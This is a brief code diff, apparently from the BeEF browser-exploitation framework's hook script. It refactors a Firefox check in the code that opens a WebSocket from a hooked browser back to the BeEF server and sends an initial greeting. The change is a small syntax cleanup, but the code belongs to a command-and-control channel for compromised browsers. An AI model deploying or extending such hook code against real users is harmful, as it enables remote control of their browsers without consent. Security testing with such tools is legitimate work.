@@ -27,10 +27,11 @@ beef.websocket = {
         var webSocketServer=beef.net.host; /*beefHost*/
         console.log(webSocketServer);
         var webSocketPort=11989;
-          if(beef.browser.getBrowserName=="FF")
+          if(beef.browser.isFF()){
               this.socket = new MozWebSocket("ws://"+webSocketServer+":"+webSocketPort+"/");
-          else
+          }else{
                this.socket = new WebSocket("ws://"+webSocketServer+":"+webSocketPort+"/");
+          }
            /*so the server is just up we need send helo id @todo insert browser ID where can i get them?*/
 
     this.socket.send("Helo"+"myid00");
